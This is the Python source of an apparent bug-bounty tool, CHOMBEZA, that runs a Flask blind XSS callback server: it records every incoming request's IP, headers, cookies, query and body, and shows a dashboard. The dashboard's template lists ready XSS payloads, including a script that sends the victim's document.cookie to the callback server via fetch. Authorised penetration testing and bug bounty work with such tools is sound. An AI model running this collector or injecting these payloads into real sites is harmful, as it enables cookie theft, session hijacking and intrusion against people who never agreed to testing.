#!/usr/bin/env python3
"""
CHOMBEZA - Blind XSS Callback Server
Created by: archnexus707 (Dickson Massawe)
"""

from flask import Flask, request, jsonify, render_template_string
import threading
import logging
import time
import socket
import sys
from typing import List, Dict, Optional
from datetime import datetime
from queue import Queue
import os

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("CHOMBEZA.BlindXSS")

# HTML template for the index page
INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>CHOMBEZA Blind XSS Server</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            border: 2px solid #00ff00;
            padding: 20px;
            border-radius: 10px;
        }
        h1 {
            color: #00ff00;
            text-align: center;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
        }
        .info {
            background: #1a1a1a;
            padding: 10px;
            border-left: 3px solid #00ff00;
            margin: 10px 0;
        }
        .payload {
            background: #002200;
            padding: 10px;
            border: 1px solid #00ff00;
            font-size: 12px;
            word-break: break-all;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .stat-box {
            background: #1a1a1a;
            padding: 10px;
            text-align: center;
            border: 1px solid #00ff00;
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #00ff00;
        }
        .stat-label {
            font-size: 12px;
            color: #888;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 CHOMBEZA Blind XSS Server</h1>
        
        <div class="info">
            <strong>Server Status:</strong> 🟢 RUNNING<br>
            <strong>Started:</strong> {{ start_time }}<br>
            <strong>Callback URL:</strong> <span style="color: #00a2ff;">{{ callback_url }}</span>
        </div>

        <div class="stats">
            <div class="stat-box">
                <div class="stat-value">{{ total_callbacks }}</div>
                <div class="stat-label">Total Callbacks</div>
            </div>
            <div class="stat-box">
                <div class="stat-value">{{ unique_ips }}</div>
                <div class="stat-label">Unique IPs</div>
            </div>
            <div class="stat-box">
                <div class="stat-value">{{ last_callback }}</div>
                <div class="stat-label">Last Callback</div>
            </div>
        </div>

        <h2>📥 Example Payloads</h2>
        <div class="payload">
            &lt;script src="{{ callback_url }}"&gt;&lt;/script&gt;
        </div>
        <div class="payload" style="margin-top: 5px;">
            &lt;img src="{{ callback_url }}" onerror="alert(1)"&gt;
        </div>
        <div class="payload" style="margin-top: 5px;">
            &lt;link rel="stylesheet" href="{{ callback_url }}"&gt;
        </div>
        <div class="payload" style="margin-top: 5px;">
            &lt;iframe src="{{ callback_url }}"&gt;&lt;/iframe&gt;
        </div>
        <div class="payload" style="margin-top: 5px;">
            &lt;script&gt;fetch('{{ callback_url }}?'+document.cookie)&lt;/script&gt;
        </div>

        <div class="footer">
            CHOMBEZA Bug Bounty Pro - Created by archnexus707
        </div>
    </div>
</body>
</html>
"""


class BlindXSSServer:
    """FIXED: Blind XSS callback server with proper shutdown"""
    
    def __init__(self, port: int = 5000, host: str = "0.0.0.0"):
        self.port = port
        self.host = host
        self.app = Flask(__name__)
        self.callbacks: List[Dict] = []
        self.callback_queue = Queue()
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.server = None
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.lock = threading.Lock()
        self._setup_routes()

    def _setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/xss', methods=['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH'])
        def xss_callback():
            """Handle XSS callbacks"""
            try:
                # Collect all request data
                data = {
                    "id": len(self.callbacks) + 1,
                    "timestamp": time.time(),
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "ip": request.remote_addr,
                    "method": request.method,
                    "path": request.path,
                    "headers": dict(request.headers),
                    "query": request.args.to_dict(),
                    "form": request.form.to_dict(),
                    "json": request.get_json(silent=True),
                    "data": request.get_data(as_text=True)[:5000],  # Limit size
                    "url": request.url,
                    "user_agent": request.headers.get('User-Agent', 'Unknown'),
                    "referer": request.headers.get('Referer', ''),
                    "cookies": dict(request.cookies)
                }
                
                # Add to queue for thread-safe processing
                self.callback_queue.put(data)
                
                # Log the callback
                logger.info(f"🎯 Blind XSS callback from {request.remote_addr} - {request.method} {request.path}")
                
                # Return a 1x1 transparent GIF (invisible)
                return (
                    b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;',
                    200,
                    {'Content-Type': 'image/gif'}
                )
                
            except Exception as e:
                logger.error(f"Error processing callback: {e}")
                return "OK", 200

        @self.app.route('/')
        def index():
            """Main status page"""
            with self.lock:
                total = len(self.callbacks)
                unique_ips = len(set(cb.get('ip') for cb in self.callbacks))
                last = self.callbacks[-1].get('time') if self.callbacks else 'Never'
            
            callback_url = f"http://{self._get_local_ip()}:{self.port}/xss"
            
            return render_template_string(
                INDEX_HTML,
                start_time=self.start_time,
                callback_url=callback_url,
                total_callbacks=total,
                unique_ips=unique_ips,
                last_callback=last
            )

        @self.app.route('/stats')
        def stats():
            """Return JSON stats"""
            with self.lock:
                return jsonify({
                    "total_callbacks": len(self.callbacks),
                    "unique_ips": len(set(cb.get('ip') for cb in self.callbacks)),
                    "last_callback": self.callbacks[-1] if self.callbacks else None,
                    "start_time": self.start_time,
                    "running": self.running
                })

        @self.app.route('/callbacks')
        def get_callbacks():
            """Return all callbacks as JSON"""
            with self.lock:
                return jsonify(self.callbacks)

        @self.app.route('/clear', methods=['POST'])
        def clear_callbacks():
            """Clear all callbacks"""
            with self.lock:
                self.callbacks.clear()
                while not self.callback_queue.empty():
                    try:
                        self.callback_queue.get_nowait()
                    except:
                        pass
            logger.info("🧹 Callbacks cleared")
            return jsonify({"status": "cleared"})

    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def _process_queue(self):
        """Process callbacks from queue (runs in separate thread)"""
        while self.running:
            try:
                # Get callback from queue with timeout
                data = self.callback_queue.get(timeout=1)
                
                # Add to list with thread safety
                with self.lock:
                    self.callbacks.append(data)
                    
                    # Limit callback list size
                    if len(self.callbacks) > 10000:
                        self.callbacks = self.callbacks[-5000:]
                
                logger.debug(f"Processed callback {data.get('id')}")
                
            except Exception as e:
                # Queue.Empty is expected, ignore
                if "Empty" not in str(e):
                    logger.error(f"Queue processing error: {e}")
                continue

    def start(self):
        """Start the Blind XSS server"""
        if self.running:
            logger.warning("Server already running")
            return

        self.running = True
        
        # Start queue processor thread
        self.queue_thread = threading.Thread(target=self._process_queue, daemon=True)
        self.queue_thread.start()
        
        # Start Flask server in a thread
        self.thread = threading.Thread(
            target=self._run_server,
            daemon=True
        )
        self.thread.start()
        
        logger.info(f"🎯 Blind XSS server started on {self.host}:{self.port}")
        print(f"\n[+] Blind XSS server started on port {self.port}")
        print(f"[+] Callback URL: http://{self._get_local_ip()}:{self.port}/xss")
        print(f"[+] Dashboard: http://{self._get_local_ip()}:{self.port}/\n")

    def _run_server(self):
        """Run the Flask server"""
        try:
            # Use Werkzeug server with threading
            from werkzeug.serving import make_server
            
            self.server = make_server(self.host, self.port, self.app, threaded=True)
            self.server.serve_forever()
            
        except Exception as e:
            logger.error(f"Server error: {e}")
            self.running = False

    def stop(self):
        """FIXED: Proper server shutdown"""
        logger.info("Stopping Blind XSS server...")
        self.running = False
        
        # Stop the Flask server
        if hasattr(self, 'server') and self.server:
            try:
                self.server.shutdown()
                self.server = None
            except Exception as e:
                logger.error(f"Error stopping server: {e}")
        
        # Wait for threads
        if hasattr(self, 'thread') and self.thread and self.thread.is_alive():
            self.thread.join(timeout=5)
        
        if hasattr(self, 'queue_thread') and self.queue_thread and self.queue_thread.is_alive():
            self.queue_thread.join(timeout=2)
        
        logger.info("Blind XSS server stopped")

    def get_callbacks(self) -> List[Dict]:
        """Get all callbacks (thread-safe)"""
        with self.lock:
            return self.callbacks.copy()

    def get_recent_callbacks(self, limit: int = 10) -> List[Dict]:
        """Get most recent callbacks"""
        with self.lock:
            return self.callbacks[-limit:].copy()

    def clear_callbacks(self):
        """Clear all callbacks"""
        with self.lock:
            self.callbacks.clear()
            while not self.callback_queue.empty():
                try:
                    self.callback_queue.get_nowait()
                except:
                    pass
        logger.info("Callbacks cleared")

    def get_stats(self) -> Dict:
        """Get server statistics"""
        with self.lock:
            return {
                "total_callbacks": len(self.callbacks),
                "unique_ips": len(set(cb.get('ip') for cb in self.callbacks)),
                "last_callback": self.callbacks[-1] if self.callbacks else None,
                "start_time": self.start_time,
                "running": self.running,
                "port": self.port
            }

    def is_running(self) -> bool:
        """Check if server is running"""
        return self.running


# Singleton instance
_default_server = None

def get_server(port: int = 5000) -> BlindXSSServer:
    """Get or create the default server instance"""
    global _default_server
    if _default_server is None:
        _default_server = BlindXSSServer(port=port)
    return _default_server